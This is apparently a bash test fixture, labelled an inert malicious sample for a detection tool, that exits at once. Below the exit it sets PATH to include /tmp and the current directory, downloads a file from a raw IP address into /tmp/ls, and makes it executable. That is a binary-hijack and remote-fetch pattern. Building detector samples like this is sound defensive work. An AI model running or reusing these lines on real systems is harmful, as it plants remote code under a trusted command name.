#!/bin/bash
# INERT malicious sample for bashka detection testing. Do not run.
exit 0
export PATH="/tmp:.:$PATH"
curl -fsSL http://45.9.148.37/tool -o /tmp/ls
chmod 777 /tmp/ls
